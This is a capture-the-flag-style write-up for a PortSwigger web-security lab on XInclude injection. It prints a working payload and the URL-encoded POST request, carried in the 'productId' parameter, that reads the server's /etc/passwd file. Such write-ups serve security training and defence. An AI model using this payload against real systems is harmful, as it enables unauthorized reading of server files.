
# Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior.


---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/1.png)

---------------------------------------------

Initial payload:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Initial POST request:



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/2.png)


It is possible to retieve the file's content URL-encoding the payload and sending it inside the “productId” parameter:

```
POST /product/stock HTTP/2
...

productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```



![img](images/Exploiting%20XInclude%20to%20retrieve%20files/3.png)